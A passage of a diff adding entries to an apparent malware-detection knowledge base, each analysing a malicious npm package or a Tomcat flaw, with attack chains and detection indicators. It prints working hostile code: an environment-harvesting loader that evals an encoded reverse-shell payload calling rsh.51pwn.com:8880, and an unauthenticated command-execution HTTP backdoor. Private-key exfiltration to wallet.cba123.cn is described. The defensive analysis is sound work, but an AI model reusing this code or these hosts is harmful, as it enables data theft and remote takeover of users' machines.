+                  "why_suspicious": "Obfuscation of the exfiltration endpoint is a clear attempt to evade detection by static and dynamic analysis tools. The behavior is otherwise identical to the previous snippet, with the same critical security violation of exfiltrating private keys.",
+                  "violated_expectations": "No legitimate cryptographic code would obfuscate network destinations or transmit private keys. Secure libraries are expected to be transparent and never hide network communication, especially involving sensitive data.",
+                  "similar_legitimate_use": "Obfuscation may be used for licensing or anti-tamper in some software, but never for exfiltrating cryptographic secrets. There is no legitimate use for this pattern in cryptographic libraries.",
+                  "key_indicators": [
+                    "Obfuscated construction of malicious host and path",
+                    "HTTPS request with private key in URL",
+                    "Try/catch block to suppress errors and evade detection",
+                    "Exfiltration of private key material"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (during cryptographic signing operations, later/obfuscated version)",
+                  "file_location": "abstract/weierstrass.js (prepSig function, later version)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@jackshanyeshuzi/curvess",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.0 - 1.1.9 (all published versions as of 2023-08-04)",
+                  "why_malicious": "This package is a typosquat of the legitimate @noble/curves cryptography library. It contains deeply embedded malicious code that exfiltrates users' private cryptographic keys to an external server (wallet.cba123.cn), compromising all cryptographic operations and user security. The malicious code is designed to be stealthy, does not alter the primary cryptographic functionality, and is triggered during sensitive operations, making it highly dangerous and difficult to detect."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs ethereum-cryptographyyy, which depends on @jackshanyeshuzi/curvess instead of @noble/curves.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious code in @jackshanyeshuzi/curvess is loaded and available."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When cryptographic signing is performed, the prepSig function in @jackshanyeshuzi/curvess is invoked.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Private key is captured and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "prepSig function sends the private key to wallet.cba123.cn via HTTP/HTTPS request.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives the user's private key, compromising all cryptographic security."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Obfuscation is added in later versions to evade detection.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Stealthier exfiltration, harder detection."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Network requests (HTTP/HTTPS) originating from cryptographic math or signing functions",
+                    "Exfiltration of private key or sensitive cryptographic material during signing operations",
+                    "Obfuscated string construction for network destinations within cryptographic code",
+                    "Unexpected logging of private keys in cryptographic libraries"
+                  ],
+                  "file_indicators": [
+                    "Import of http or https modules in cryptographic math files (e.g., abstract/weierstrass.js)",
+                    "Typosquatted package names in dependencies (e.g., @jackshanyeshuzi/curvess instead of @noble/curves)",
+                    "prepSig function containing network requests or exfiltration logic"
+                  ],
+                  "network_indicators": [
+                    "Connections to wallet.cba123.cn",
+                    "IP address 42.96.168.4 (ALISOFT, CN)",
+                    "Unusual HTTP/HTTPS requests during cryptographic operations"
+                  ],
+                  "how_to_detect": "Monitor for network requests originating from cryptographic libraries, especially during signing or key generation. Flag any code that logs or transmits private keys. Detect obfuscated string construction that resolves to known malicious domains such as wallet.cba123.cn. Audit dependencies for typosquatting and unexpected changes in package.json. Alert on the import of network modules (http, https) in files that should only perform mathematical operations. Correlate network activity with cryptographic function execution to identify exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5042173862457275,
+              "code_similarity": 0.5882856845855713,
+              "behavior_similarity": 0.420149028301239,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20240813_211342_340597_snippet_5",
+              "source_package": "glup-debugger-log (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240813_211342_340597/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.49708327651023865,
+              "code_similarity": 0.5301119089126587,
+              "behavior_similarity": 0.4640546441078186,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "http.createServer({ 'requestTimeout': 60000 }, (request, response) => {\n  response.writeHead(200, { 'Content-Type': 'text/plain;charset=UTF-8' });\n  let command = url.parse(request.url, true).query.cmd;\n  if (command) {\n    try {\n      childProcess.exec(Buffer.from(\"Y2hjcCA2NTAwMQ==\", \"base64\").toString() + \" & \" + command, {\n        'encoding': \"buffer\",\n        'windowsHide': true\n      }, (error, stdout, stderr) => {\n        if (error) {\n          response.end(\"ERR:\\n\" + error.message);\n        } else {\n          if (stdout) {\n            response.end('' + iconv.decode(stdout, \"gbk\"));\n          } else if (stderr) {\n            response.end(\"ERR:\\n\" + iconv.decode(stderr, \"gbk\"));\n          }\n        }\n      });\n    } catch (error) {\n      response.end(\"ERR:\\n\" + error);\n    }\n  }\n}).listen(3004);",
+                "code_behavior": "At runtime, the code starts an HTTP server on port 3004 that executes arbitrary system commands received via the 'cmd' query parameter and returns the output to the remote attacker, enabling unauthenticated remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Setting up a local HTTP server for unauthenticated remote code execution is a hallmark of RATs and backdoors, providing attackers with persistent, covert access.",
+                  "violated_expectations": "Legitimate packages do not expose arbitrary command execution over HTTP, especially without authentication or access controls.",
+                  "similar_legitimate_use": "Some legitimate development tools may expose HTTP APIs, but never for unauthenticated system command execution.",
+                  "key_indicators": [
+                    "HTTP server on non-standard port (3004)",
+                    "Command execution via unauthenticated query parameter",
+                    "No authentication or access control",
+                    "Base64-decoded command preamble to evade detection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (via play-share.js)",
+                  "file_location": "lib/play-share.js (deobfuscated)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "glup-debugger-log",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.3",
+                  "why_malicious": "The package contains heavily obfuscated JavaScript code that functions as both a dropper and a remote access trojan (RAT). It performs environment checks to selectively target systems, downloads and executes additional payloads, and establishes a persistent, unauthenticated HTTP server for arbitrary remote code execution, all without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed via npm test or import, triggering the bind() function.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initial dropper logic is launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Dropper performs environment checks and conditionally executes or downloads further payloads.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malware is deployed and/or additional payloads are executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by launching play-share.js as a detached process.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "RAT component is activated."
+                  },
+                  {
+                    "step": 4,
+                    "action": "RAT HTTP server is started, allowing remote attackers to execute arbitrary commands.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of obfuscated JavaScript files during npm install, test, or import",
+                    "Spawning of detached Node.js background processes running secondary scripts",
+                    "Creation of local HTTP server on non-standard port (e.g., 3004) for command execution",
+                    "Environment checks targeting Windows and active user environments before payload execution",
+                    "Conditional download and execution of remote payloads based on hidden configuration"
+                  ],
+                  "file_indicators": [
+                    "lib/play.js (obfuscated, high entropy)",
+                    "lib/play-share.js (obfuscated, high entropy)",
+                    "node.compress.exe",
+                    "node.compress.lock.log",
+                    "Batch files with random names in temporary directories"
+                  ],
+                  "network_indicators": [
+                    "HTTP server listening on port 3004 for incoming command requests",
+                    "Outbound HTTP GET requests to attacker-controlled URLs for payload download"
+                  ],
+                  "how_to_detect": "Monitor for execution of obfuscated JavaScript files during npm install, test, or import. Flag packages that spawn detached Node.js processes or create local HTTP servers on non-standard ports such as 3004. Detect creation of suspicious files including node.compress.exe, node.compress.lock.log, and batch files with random names in temp directories. Watch for outbound HTTP requests to unknown or suspicious domains and for local servers listening for command parameters. Use static analysis to identify high-entropy, obfuscated code and dynamic analysis to observe process spawning, file creation, and network activity indicative of RAT behavior."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113217_475177_snippet_1",
+              "source_package": "Apache Tomcat (N/A (Java application server, distributed via official website and package repositories))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113217_475177/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4925539493560791,
+              "code_similarity": 0.42640742659568787,
+              "behavior_similarity": 0.558700442314148,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representing the vulnerable logic\nif (websocket.sendMessage() && websocket.isClosing()) {\n    // Error handling triggers\n    objectPool.returnObject(websocket); // WebSocket object returned to pool\n}\n// Later, a new connection retrieves the same object\nWebSocket reusedWebSocket = objectPool.borrowObject();",
+                "code_behavior": "At runtime, when a WebSocket message is sent concurrently with the connection closing, the error handling logic returns the WebSocket object to the pool without proper cleanup, allowing a subsequent connection to borrow the same object with residual state, resulting in sensitive data from one user session being accessible in another session.",
+                "malice_analysis": {
+                  "why_suspicious": "This behavior is suspicious because it enables the exposure of sensitive data from one user's session to another user by reusing WebSocket objects that have not been properly reset or cleaned up, directly violating session isolation and confidentiality guarantees.",
+                  "violated_expectations": "Normally, WebSocket objects should be fully closed and all session-specific state cleared before being returned to the object pool, ensuring that no residual data or state is accessible to subsequent users. The actual behavior allows object reuse with leftover state, leading to unintended data leakage between sessions.",
+                  "similar_legitimate_use": "Object pooling is a legitimate performance optimization technique, but only when pooled objects are thoroughly reset and isolated between uses. In secure implementations, session-specific data is always cleared before reuse.",
+                  "key_indicators": [
+                    "WebSocket object returned to pool while still in use or not fully closed",
+                    "Subsequent connections reusing pooled WebSocket objects with residual state",
+                    "Presence of session data from one user in another user's WebSocket session",
+                    "Concurrent send and close operations on the same WebSocket object"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, during concurrent WebSocket message send and connection close events",
+                  "file_location": "Tomcat WebSocket implementation (Java server-side code, internal object pool management)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Apache Tomcat",
+                  "package_manager": "N/A (Java application server, distributed via official website and package repositories)",
+                  "package_versions": "9.0.0.M1 to 9.0.20, 8.5.0 to 8.5.75",
+                  "why_malicious": "The affected versions of Apache Tomcat contain a vulnerability (CVE-2022-25762) in the WebSocket implementation that allows sensitive data from one user session to be exposed to another user, violating confidentiality. This occurs due to improper object pooling and error handling, where pooled WebSocket objects may be reused across connections without proper cleanup, leading to data leakage between sessions."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends a WebSocket message at the precise moment the connection is closing, triggering the vulnerable error handling logic.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "WebSocket object is returned to the pool in an unsafe state, potentially retaining session data."
+                  },
+                  {
+                    "step": 2,
+                    "action": "A new user (User B) establishes a WebSocket connection, which borrows the same pooled object that was not properly cleaned.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Residual data from the previous session (User A) is accessible in User B's session, or vice versa."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker receives data intended for another user, or another user receives data from the attacker's session, resulting in information disclosure.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Confidentiality breach; attacker or unintended user gains access to sensitive data from another session."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Concurrent WebSocket message send and connection close events in Tomcat logs",
+                    "Unexpected reuse of WebSocket objects across different user sessions (e.g., same object ID or memory address in multiple sessions)",
+                    "Data leakage between WebSocket sessions, such as session data appearing in unrelated connections"
+                  ],
+                  "file_indicators": [
+                    "No specific file indicators; detection must focus on runtime behavior in Tomcat's WebSocket implementation"
+                  ],
+                  "network_indicators": [
+                    "WebSocket messages containing data from unrelated user sessions",
+                    "Duplicate or unexpected session data observed in WebSocket traffic between different users"
+                  ],
+                  "how_to_detect": "Monitor Tomcat server logs and WebSocket traffic for evidence of data leakage between sessions, such as the same WebSocket object ID or session data appearing in multiple user connections. Implement runtime instrumentation or auditing to detect when WebSocket objects are returned to the pool while still in use or not fully closed. Look for patterns of concurrent send and close operations on the same WebSocket connection, and alert if pooled objects are reused without proper cleanup. Automated detection can include correlation of session identifiers and object reuse events, and flagging any instance where session data crosses user boundaries."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
